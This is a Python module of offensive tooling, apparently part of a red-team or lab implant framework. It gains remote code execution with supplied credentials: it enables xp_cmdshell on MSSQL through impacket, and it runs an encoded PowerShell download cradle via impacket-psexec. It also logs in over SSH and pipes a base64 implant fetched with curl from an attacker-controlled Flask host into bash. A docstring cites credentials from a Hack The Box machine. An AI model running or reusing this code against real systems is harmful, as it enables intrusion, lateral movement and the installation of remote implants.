import pwn
import hashlib, binascii
import base64
import paramiko

# Custom imports
import implants

"""
With valid credentials and correct permissions, execute commands on remote MSSQL server

Example usage (Tested on HTB Querier):
    username = "mssql-svc"
    password = "corporate568"
    target = "10.10.10.125"
    command = "ping 10.10.14.10"
    print(mssql_rce(username, password, target, command))
"""
def mssql_rce(username, password, target, command):
    p = pwn.process(["/usr/bin/impacket-mssqlclient", "-windows-auth", f"{username}:{password}@{target}"], stdin=pwn.PTY)
    p.readuntil(")>")
    p.send(b"enable_xp_cmdshell\n")
    p.send(b'\4')
    p.readuntil("install.")
    p.readuntil("install.")
    p.send(f"xp_cmdshell {command}\n")
    p.send(b'\4')
    p.readuntil("NULL")
    output = p.readuntil("NULL")
    decoded_output = output.decode('utf-8')
    cleaned_output = decoded_output.replace('NULL', '').strip()
    return cleaned_output

"""
With valid credentials, psexec and run implant code
"""
def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
    payload = f'IEX(New-Object Net.WebClient).downloadString("http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1")'
    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
    cmd = f"powershell -e {b64}\n"

    p = pwn.process(["/usr/bin/impacket-psexec", "-hashes", f":{ntlm}", f"{username}:'{password}'@{target}"], stdin=pwn.PTY)
    print(p.readuntil(">"))
    p.send(cmd.encode())
    p.send(b'\4')
    print(p.readuntil("Checking"))
    p.readall()

def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the server
    try:
        client.connect(target, port=22, username=username, password=password)
        print("Connection successful!")

        # Run a command
        command = f"curl http://{FLASK_HOST}:{FLASK_PORT}/static/lin | base64 -d | bash"
        stdin, stdout, stderr = client.exec_command(command)
        print("Command Output:")
        print(stdout.read().decode())  # Print command output

        # Close the connection
        client.close()

    except Exception as e:
        print(f"Error occurred: {e}")

if __name__=="__main__":
    ssh("root", "password", "192.168.108.19", "192.168.108.15", "5000")
